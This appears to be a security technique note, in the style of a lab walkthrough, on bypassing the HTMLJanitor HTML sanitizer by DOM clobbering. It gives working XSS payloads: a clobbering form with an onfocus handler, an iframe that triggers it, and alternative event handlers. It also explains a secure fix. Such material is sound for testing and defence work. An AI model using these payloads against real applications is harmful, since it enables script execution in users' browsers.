# DOM Clobbering — Sanitizer Bypass (Clobber `node.attributes`)

## When this applies

The application uses an HTML sanitizer (HTMLJanitor, sanitize-html, custom) that loops over `node.attributes` to remove dangerous attributes. By injecting an `<input id=attributes>` inside a parent element, attacker clobbers the parent's `attributes` property, making the loop iterate over `undefined.length` — the loop never executes, dangerous attributes (event handlers) survive sanitization.

## Technique

DOM clobbering targets the JavaScript code that does the sanitization itself. Sanitizers that assume `node.attributes` is always a `NamedNodeMap` are vulnerable when an inner element with `id=attributes` overrides it.

### Vulnerable Code

**HTMLJanitor sanitization:**
```javascript
for (var a = 0; a < node.attributes.length; a += 1) {
    var attr = node.attributes[a];
    if (shouldRejectAttr(attr, allowedAttrs, node)) {
        node.removeAttribute(attr.name);
        a = a - 1;
    }
}
```

**Normal behavior:**
```javascript
form.attributes // NamedNodeMap {0: attr1, 1: attr2, length: 2}
form.attributes.length // 2
```

**After clobbering:**
```html
<form id=x><input id=attributes></form>
```

```javascript
form.attributes // <input id=attributes> (the element!)
form.attributes.length // undefined
```

## Steps

### Vulnerability Analysis
- **Target:** HTMLJanitor's attribute sanitization loop
- **Clobbering:** `form.attributes` property
- **Bypass:** Loop never executes (length = undefined)
- **Result:** Event handlers not removed

### Step-by-Step Solution

1. Understand HTMLJanitor loops through `node.attributes`.
2. Clobber `attributes` property with `<input id=attributes>`.
3. Make `form.attributes.length` return undefined.
4. Loop condition fails: `for (var a = 0; a < undefined; a++)`.
5. Event handler (`onfocus`) never removed.
6. Use iframe to trigger focus on clobbered form.

### Working Exploit

**Comment payload:**
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

**Exploit server payload:**
```html
<iframe src="https://target.com/post?postId=3"
        onload="setTimeout(()=>this.src=this.src+'#x',500)">
</iframe>
```

### How the Clobbering Works

**Step 1 - Comment HTML:**
```html
<form id=x tabindex=0 onfocus=print()>
    <input id=attributes>
</form>
```

**Step 2 - HTMLJanitor tries to sanitize:**
```javascript
for (var a = 0; a < node.attributes.length; a += 1) {
    // node = <form id=x>
    // node.attributes = <input id=attributes> (clobbered!)
    // node.attributes.length = undefined
    // for (var a = 0; a < undefined; a += 1)
    // Condition is false, loop never runs!
    // onfocus attribute never removed!
}
```

**Step 3 - iframe triggers focus:**
```javascript
setTimeout(() => this.src = this.src + '#x', 500)
// After 500ms, adds #x fragment
// Browser scrolls to element with id="x"
// Focus event triggers
// onfocus=print() executes
```

### Payload Breakdown

**Form attributes:**
- `id=x` - Identifier for URL fragment targeting
- `tabindex=0` - Makes form focusable
- `onfocus=print()` - Payload (should be removed but isn't)

**Input purpose:**
- `id=attributes` - Clobbers form.attributes property

**iframe onload:**
```javascript
setTimeout(() => this.src = this.src + '#x', 500)
```
- Waits 500ms for page to load
- Appends `#x` to URL
- Browser focuses element with id="x"
- onfocus event fires

### Why the Delay is Necessary

The 500ms delay ensures:
1. Comment is fully loaded and rendered
2. DOM clobbering has taken effect
3. HTMLJanitor has run (and failed to remove onfocus)
4. Form element exists before focusing

### Alternative Event Handlers

```html
<!-- Using onanimationstart -->
<form id=x style="animation:x 1ms" onanimationstart=print()>
    <input id=attributes>
</form>

<!-- Using onmouseover (less reliable) -->
<form id=x onmouseover=print()>
    <input id=attributes>
</form>

<!-- Using onclick (requires actual click) -->
<form id=x onclick=print()>
    <input id=attributes>
</form>
```

### Why onfocus is Best

- Can be triggered programmatically via URL fragment
- Doesn't require user interaction (automated)
- Reliable across browsers
- Works with iframe delivery

### Testing the Clobbering

**In browser console:**
```javascript
// Before clobbering
let form = document.createElement('form');
console.log(form.attributes); // NamedNodeMap
console.log(form.attributes.length); // 0

// After clobbering (in actual page)
// <form id=x><input id=attributes></form>
let clobberedForm = document.getElementById('x');
console.log(clobberedForm.attributes); // <input> element
console.log(clobberedForm.attributes.length); // undefined
```

### HTMLJanitor Vulnerability Pattern

**Vulnerable code:**
```javascript
// Assumes attributes is always a NamedNodeMap
for (var i = 0; i < node.attributes.length; i++) {
    // Sanitize attributes
}
```

**Secure alternative:**
```javascript
// Use Array.from to ensure proper iteration
let attrs = Array.from(node.attributes);
for (var i = 0; i < attrs.length; i++) {
    // Sanitize attributes
}
```

## Verifying success

- `clobberedForm.attributes` returns an `<input>` element instead of a `NamedNodeMap`.
- `clobberedForm.attributes.length` is `undefined` (not `0` or a positive integer).
- The dangerous attribute (`onfocus=print()`) survives sanitization — present in the rendered DOM after sanitizer runs.
- Triggering focus (URL fragment `#x`) executes the payload.

## Common pitfalls

1. **Sanitizer iterates with `Array.from(node.attributes)`** — this defensive pattern defeats clobbering. Read the sanitizer's source.
2. **Library upgraded recently** — check if HTMLJanitor / sanitize-html version has the fix.
3. **`<input>` outside the form** — the clobbering only works when `<input id=attributes>` is a *child* of the form being sanitized.
4. **Wrong target attribute name** — sanitizer might iterate `node.attrs` instead of `node.attributes`. Match exactly.
5. **Iframe delivery delay too short** — DOM may not have applied clobbering yet. Use `setTimeout(..., 500)` or longer.

## Tools

- **DOM Invader** — flags clobbering opportunities, including sanitizer-internal targets
- **`grep -n 'node.attributes'`** in sanitizer source — find vulnerable iteration patterns
- **Local sanitizer test page** — verify your payload survives the sanitizer pipeline
- **PortSwigger "DOM Clobbering Strikes Back" research** — sanitizer-bypass gadget reference

## Related

- `dom-clobbering-globals.md` — clobbering `window.*` for XSS via OR-default patterns
